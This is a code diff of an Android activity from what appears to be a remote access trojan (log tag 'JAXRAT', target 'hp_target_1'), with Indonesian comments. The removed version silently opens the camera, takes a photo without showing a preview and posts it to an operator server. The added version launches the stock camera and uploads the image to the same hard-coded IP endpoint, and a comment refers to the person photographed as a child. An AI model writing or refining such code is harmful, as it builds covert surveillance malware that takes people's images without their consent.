@@ -1,85 +1,64 @@
 package com.ezax.agent;
 
-import android.Manifest;
-import android.content.pm.PackageManager;
-import android.hardware.Camera;
+import android.app.Activity;
+import android.content.Intent;
+import android.graphics.Bitmap;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
+import android.provider.MediaStore;
 import android.util.Log;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import java.io.*;
+import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class CameraActivity extends AppCompatActivity {
-    private Camera camera;
-    private int cameraId = 0;
-    private boolean isFront = false;
-    private String serverUrl = "http://192.168.1.17:5000"; // IP KAMU
+public class CameraActivity extends Activity {
+    // SESUAIKAN IP INI DENGAN IP LAPTOP KAMU SEKARANG
+    private String serverUrl = "http://192.168.1.17:5000/api/upload_image/hp_target_1";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            kirimError("Izin Kamera Ditolak!");
-            finish(); return;
-        }
-
-        isFront = getIntent().getBooleanExtra("FRONT", false);
-
+        
+        // Buka aplikasi kamera bawaan Android
+        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        
         try {
-            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
-            for (int camIdx = 0; camIdx < Camera.getNumberOfCameras(); camIdx++) {
-                Camera.getCameraInfo(camIdx, cameraInfo);
-                if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { cameraId = camIdx; break; }
-                else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) { cameraId = camIdx; break; }
-            }
-
-            camera = Camera.open(cameraId);
-            camera.startPreview(); // Tetap start preview walau tanpa layar
-
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try {
-                    camera.takePicture(null, null, (data, cam) -> {
-                        uploadImage(data);
-                    });
-                } catch (Exception e) {
-                    kirimError("Gagal Jepret: " + e.getMessage());
-                    finish();
-                }
-            }, 1000);
-
+            startActivityForResult(takePictureIntent, 100);
         } catch (Exception e) {
-            kirimError("Kamera Error: " + e.getMessage());
+            kirimError("Gagal buka aplikasi kamera bawaan");
             finish();
         }
     }
 
-    // Fungsi buat lapor error ke Web
-    private void kirimError(String pesanError) {
-        new Thread(() -> {
-            try {
-                URL url = new URL(serverUrl + "/api/upload_result/hp_target_1");
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/json");
-                conn.setDoOutput(true);
-                String json = "{\"type\":\"camera_error\", \"data\":\"" + pesanError + "\"}";
-                OutputStream os = conn.getOutputStream();
-                os.write(json.getBytes("UTF-8"));
-                os.close();
-                conn.getResponseCode();
-            } catch (Exception e) { }
-        }).start();
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        
+        if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
+            // Ambil gambar (thumbnail)
+            Bundle extras = data.getExtras();
+            Bitmap imageBitmap = (Bitmap) extras.get("data");
+            
+            if (imageBitmap != null) {
+                // Kompres jadi JPEG
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                imageBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
+                byte[] imageBytes = baos.toByteArray();
+                uploadImage(imageBytes);
+            } else {
+                finish();
+            }
+        } else {
+            // Kalau user (anak) membatalkan foto, tutup layar
+            finish();
+        }
     }
 
     private void uploadImage(byte[] imageBytes) {
         new Thread(() -> {
             try {
-                URL url = new URL(serverUrl + "/api/upload_image/hp_target_1");
+                URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
@@ -92,21 +71,17 @@ public class CameraActivity extends AppCompatActivity {
                 request.write(imageBytes);
                 request.writeBytes("\r\n--" + boundary + "--\r\n");
                 request.flush(); request.close();
-                conn.getResponseCode();
-            } catch (Exception e) { }
+                
+                Log.d("JAXRAT", "Upload Selesai: " + conn.getResponseCode());
+            } catch (Exception e) { 
+                Log.e("JAXRAT", "Upload Error", e); 
+            }
             
-            // Kasih jeda 3 detik sebelum nutup aplikasi, biar upload selesai
-            try { Thread.sleep(3000); } catch (Exception e) {}
             runOnUiThread(this::finish); 
         }).start();
     }
 
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (camera != null) {
-            try { camera.stopPreview(); camera.release(); } catch (Exception e) {}
-            camera = null;
-        }
+    private void kirimError(String pesan) {
+        Log.e("JAXRAT", pesan);
     }
 }
